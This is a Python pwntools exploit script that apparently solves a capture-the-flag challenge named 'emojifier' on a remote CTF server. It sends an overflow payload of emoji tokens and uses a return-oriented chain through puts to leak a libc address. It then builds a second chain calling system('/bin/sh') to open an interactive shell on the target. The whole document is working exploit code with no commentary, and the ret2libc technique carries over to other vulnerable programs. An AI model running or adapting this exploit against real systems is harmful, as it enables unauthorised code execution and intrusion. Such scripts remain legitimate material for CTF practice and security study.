from pwn import *
context.log_level='debug'
context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./emojifier')
p = remote("challs.ifctf.fibonhack.it",10025)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p,'b *0x80499B7')
puts = 0x8049090
got= 0x804c020
main = 0x80499b8
sla(":\n\n",b":hadouken:"*0x8+b':sob:'*2+b'\1'+flat([1,puts,main,got,]))
ru(b"#######\n")
ru(b"#######\n")

base = u32(p.read(4))-0x73260
warning(hex(base))
libc = ELF("./emojifier").libc
libc.address =base
sla(":\n\n",b":hadouken:"*0x8+b':sob:'*2+b'\1'+flat([1,libc.sym['system'],0,libc.search(b"/bin/sh").__next__(),]))

p.interactive()
